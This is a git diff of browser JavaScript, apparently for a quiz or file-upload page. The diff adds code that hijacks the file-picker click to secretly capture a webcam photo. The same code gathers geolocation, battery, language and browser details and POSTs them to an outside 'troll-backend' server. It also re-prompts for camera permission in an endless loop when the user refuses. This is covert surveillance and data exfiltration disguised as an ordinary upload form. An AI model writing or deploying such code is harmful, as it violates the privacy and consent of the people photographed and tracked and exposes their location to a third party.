@@ -1,21 +1,20 @@
-// =========================
-// Elements
-// =========================
+// ------------------------------
+// DOM Elements
+// ------------------------------
 const fileInput = document.getElementById("user-file");
 const submitBtn = document.getElementById("submit-btn");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const toast = document.getElementById("toast");
-const form = document.getElementById("quiz-form");
 
-// =========================
+// ------------------------------
 // Camera constraints
-// =========================
+// ------------------------------
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// =========================
-// Show toast
-// =========================
+// ------------------------------
+// Show toast helper
+// ------------------------------
 function showToast(message = "Captured and sent!") {
   toast.textContent = message;
   toast.style.display = "block";
@@ -24,9 +23,18 @@ function showToast(message = "Captured and sent!") {
   }, 3000);
 }
 
-// =========================
+// ------------------------------
+// Capture photo from video
+// ------------------------------
+async function capturePhoto() {
+  const context = canvas.getContext("2d");
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  return canvas.toDataURL("image/png");
+}
+
+// ------------------------------
 // Collect metadata
-// =========================
+// ------------------------------
 async function collectMetadata() {
   const metadata = {
     useragent: navigator.userAgent,
@@ -36,103 +44,83 @@ async function collectMetadata() {
     language: navigator.language,
     battery: "N/A",
     location: "N/A",
-    time: new Date().toLocaleString(),
+    time: new Date().toISOString(),
   };
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const battery = await navigator.getBattery();
-      metadata.battery = battery.level * 100;
+      metadata.battery = `${battery.level * 100}% (charging: ${battery.charging})`;
     } catch {}
   }
 
-  // Location
   if (navigator.geolocation) {
     try {
-      const pos = await new Promise((resolve, reject) =>
-        navigator.geolocation.getCurrentPosition(resolve, reject)
-      );
-      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject);
+      });
+      metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
     } catch {}
   }
 
   return metadata;
 }
 
-// =========================
-// Capture photo from webcam
-// =========================
-async function capturePhoto() {
-  const context = canvas.getContext("2d");
-  context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const imageData = canvas.toDataURL("image/png");
-  return imageData;
-}
-
-// =========================
+// ------------------------------
 // Send data to backend
-// =========================
+// ------------------------------
 async function sendData(imageData, metadata) {
   try {
-    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
+    const response = await fetch("https://troll-backend.onrender.com/api/upload", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image: imageData, metadata }),
     });
-    const result = await res.json();
-    console.log("Backend response:", result);
-    showToast("Photo & metadata sent successfully!");
+    const result = await response.json();
+    console.log("Upload result:", result);
+    showToast("Camera capture sent!");
   } catch (err) {
     console.error("Error sending data:", err);
-    showToast("Failed to send data");
+    showToast("Error sending data!");
   }
 }
 
-// =========================
-// Ask for camera & capture
-// =========================
+// ------------------------------
+// Main function: request camera + capture + send
+// ------------------------------
 async function requestCameraAndCapture() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // Ensure video has time to warm up
-    await new Promise((resolve) => setTimeout(resolve, 2500));
+    // Wait until the video has real data
+    await new Promise((resolve) => {
+      video.onloadeddata = () => resolve();
+    });
 
-    const metadata = await collectMetadata();
+    // Extra small delay to ensure real frame
+    await new Promise((resolve) => setTimeout(resolve, 800));
+
+    // Capture photo and metadata
     const imageData = await capturePhoto();
+    const metadata = await collectMetadata();
 
-    // Send data to backend
     await sendData(imageData, metadata);
 
     // Stop camera stream after capture
     stream.getTracks().forEach((track) => track.stop());
   } catch (err) {
     console.warn("Camera permission denied or error:", err);
-    alert("Camera permission is required. Please allow access and try again.");
-    // Retry until allowed
-    await requestCameraAndCapture();
+    alert("Camera permission is required. Please allow access.");
+    await requestCameraAndCapture(); // Retry until allowed
   }
 }
 
-// =========================
-// File input click handler
-// =========================
+// ------------------------------
+// Trigger camera capture on file click
+// ------------------------------
 fileInput.addEventListener("click", async (e) => {
-  e.preventDefault(); // prevent default file picker
-
-  // Ask camera permission first and capture photo
+  e.preventDefault(); // Prevent default file picker until camera allowed
   await requestCameraAndCapture();
-
-  // Then allow user to select file
-  fileInput.click();
-});
-
-// =========================
-// Form submission
-// =========================
-form.addEventListener("submit", (e) => {
-  e.preventDefault();
-  showToast("Form submitted!"); // optional, handle other form data submission if needed
+  fileInput.click(); // Now open file selection dialog
 });
